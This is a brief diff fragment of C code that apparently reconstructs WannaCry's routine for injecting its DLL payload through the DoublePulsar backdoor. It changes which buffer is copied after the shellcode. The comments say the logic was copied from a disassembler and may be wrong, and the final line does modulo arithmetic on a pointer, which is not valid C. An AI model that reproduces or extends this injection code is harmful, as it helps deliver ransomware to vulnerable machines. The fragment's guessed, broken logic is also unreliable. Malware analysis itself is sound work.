@@ -213,7 +213,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	
 	//could be wrong but copied from IDA
 	//looks like the DLL is added to the hMem location right after the runDLL shellcode
-	memcpy(hMem + shellcode_payload_size, h64_DLL, DLLSize);
+	memcpy(hMem + shellcode_payload_size, DLLPayload, DLLSize);
 	
 	//not sure what is going on here, but looks like the total_size is getting populated here
 	if (&DLLPayload[shellcode_payload_size] % 4)
